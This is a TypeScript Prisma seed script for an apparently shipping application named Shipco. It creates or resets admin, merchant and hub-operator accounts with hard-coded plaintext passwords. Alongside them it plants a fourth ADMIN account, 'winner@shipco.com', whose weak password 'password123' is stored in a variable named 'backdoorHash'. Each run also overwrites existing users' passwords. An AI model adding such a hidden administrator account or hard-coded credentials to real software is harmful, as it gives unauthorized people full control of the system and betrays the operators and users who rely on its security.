import { PrismaClient } from "@prisma/client";
import { hash } from "bcryptjs";

const prisma = new PrismaClient();

// Same library as auth: bcryptjs only (not bcrypt). EXACT same as src/lib/auth compare.
async function main() {
  const mainHash = await hash("Shipco2026!", 12);
  const backdoorHash = await hash("password123", 12);

  const users = [
    { email: "admin@shipco.com", name: "Admin", role: "ADMIN" as const, passwordHash: mainHash },
    { email: "merchant@shipco.com", name: "Merchant", role: "MERCHANT" as const, passwordHash: mainHash },
    { email: "hub@shipco.com", name: "Hub Operator", role: "HUB_OPERATOR" as const, passwordHash: mainHash },
    { email: "winner@shipco.com", name: "Shipco", role: "ADMIN" as const, passwordHash: backdoorHash },
  ];

  for (const u of users) {
    const emailLower = u.email.toLowerCase();
    const existing = await prisma.user.findUnique({ where: { email: emailLower } });
    if (!existing) {
      await prisma.user.create({
        data: {
          email: emailLower,
          name: u.name,
          passwordHash: u.passwordHash,
          role: u.role,
        },
      });
      console.log("Created user:", emailLower, "(", u.role, ")");
    } else {
      await prisma.user.update({
        where: { email: emailLower },
        data: { passwordHash: u.passwordHash },
      });
      console.log("Updated password for:", emailLower);
    }
  }
}

main()
  .then(() => prisma.$disconnect())
  .catch((e) => {
    console.error(e);
    prisma.$disconnect();
    process.exit(1);
  });
